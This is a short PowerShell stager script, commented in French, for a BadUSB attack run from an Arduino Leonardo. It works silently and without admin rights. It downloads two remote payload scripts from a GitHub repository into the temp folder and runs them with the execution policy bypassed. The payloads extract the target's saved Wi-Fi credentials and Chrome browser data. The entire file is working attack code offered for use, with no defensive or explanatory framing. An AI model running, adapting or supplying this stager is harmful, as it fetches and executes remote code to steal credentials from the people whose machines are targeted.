# Plan A BadUSB : Wi-Fi + Chrome filesystem — sans admin, sans UAC.
# Cible : powershell 5.1 via irm|iex (Leonardo wifi_pull / credz_pull).
$ErrorActionPreference = 'SilentlyContinue'
$Root = 'https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main'

$wifiSrc = Join-Path $env:TEMP 'wifi-extract.ps1'
$chromeSrc = Join-Path $env:TEMP 'chrome-extract.ps1'
try {
    Invoke-WebRequest -Uri "$Root/wifi-extract.ps1" -UseBasicParsing -OutFile $wifiSrc
    Invoke-WebRequest -Uri "$Root/chrome-extract.ps1" -UseBasicParsing -OutFile $chromeSrc
} catch {
    throw "Telechargement payloads echoue : $($_.Exception.Message)"
}

& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $wifiSrc
if ($LASTEXITCODE -ne 0) { Write-Warning "wifi-extract exit $LASTEXITCODE" }

$pwsh = (Get-Command pwsh -ErrorAction SilentlyContinue).Source
if ($pwsh) {
    & $pwsh -NoProfile -ExecutionPolicy Bypass -File $chromeSrc
} else {
    $note = Join-Path $env:TEMP 'chrome-leonardo.txt'
    @(
        "Chrome export $(Get-Date -Format o)"
        'SKIP: pwsh 7+ absent sur la cible (requis pour AesGcm).'
        'Wi-Fi : voir wifi-leonardo.txt'
    ) | Set-Content -LiteralPath $note -Encoding utf8
    Start-Process notepad.exe -ArgumentList $note
}